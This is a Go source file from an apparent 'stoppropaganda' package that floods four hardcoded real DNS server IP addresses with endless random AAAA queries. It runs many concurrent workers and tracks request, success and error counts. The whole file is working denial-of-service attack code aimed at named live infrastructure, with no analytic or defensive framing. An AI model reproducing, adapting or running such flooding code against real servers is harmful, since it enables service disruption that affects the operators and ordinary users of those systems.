package stoppropaganda

import (
	"net"
	"sync"

	"github.com/miekg/dns"
)

// Source: https://twitter.com/FedorovMykhailo/status/1497642156076511233

var targetDNS = map[string]struct{}{
	"194.54.14.186:53": {},
	"194.54.14.187:53": {},
	"194.67.7.1:53":    {},
	"194.67.2.109:53":  {},
}

var dnsServers = map[string]*DNSServer{}

type DNSServer struct {
	Requests     uint   `json:"requests"`
	Success      uint   `json:"success"`
	Errors       uint   `json:"errors"`
	LastErrorMsg string `json:"last_error_msg"`

	mux *sync.Mutex
}

func (ds *DNSServer) Start(endpoint string) {
	c := new(dns.Client)
	c.Dialer = &net.Dialer{
		Timeout: *flagTimeout,
	}
	questionDomain := getRandomDomain()+"."
	m := new(dns.Msg)
	m.SetQuestion(questionDomain, dns.TypeAAAA)

	f := func() {
		for {
			_, _, err := c.Exchange(m, endpoint)

			ds.mux.Lock()
			ds.Requests++
			if err != nil{
				ds.Errors++
				ds.LastErrorMsg = err.Error()
			} else {
				ds.Success++
			}
			ds.mux.Unlock()
		}
	}

	for i := 0; i < *flagDNSWorkers; i++ {
		go f()
	}
}
